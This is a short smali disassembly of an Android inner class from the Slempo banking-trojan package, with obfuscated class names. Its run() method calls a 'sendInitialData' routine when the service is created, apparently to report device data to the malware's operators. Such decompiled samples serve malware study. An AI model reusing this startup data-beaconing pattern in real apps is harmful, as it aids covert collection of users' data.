.class Lorg/slempo/service/tiunjvmkldioew$1;
.super Ljava/lang/Object;
.source "tiunjvmkldioew.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lorg/slempo/service/tiunjvmkldioew;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lorg/slempo/service/tiunjvmkldioew;


# direct methods
.method constructor <init>(Lorg/slempo/service/tiunjvmkldioew;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lorg/slempo/service/tiunjvmkldioew$1;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    .line 66
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    .prologue
    .line 69
    iget-object v0, p0, Lorg/slempo/service/tiunjvmkldioew$1;->this$0:Lorg/slempo/service/tiunjvmkldioew;

    invoke-static {v0}, Lorg/slempo/service/tiunjvmkldioew;->access$0(Lorg/slempo/service/tiunjvmkldioew;)Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lorg/slempo/service/utils/EURIDJVKCNWKDSeduvhj;->sendInitialData(Landroid/content/Context;)V

    .line 70
    return-void
.end method
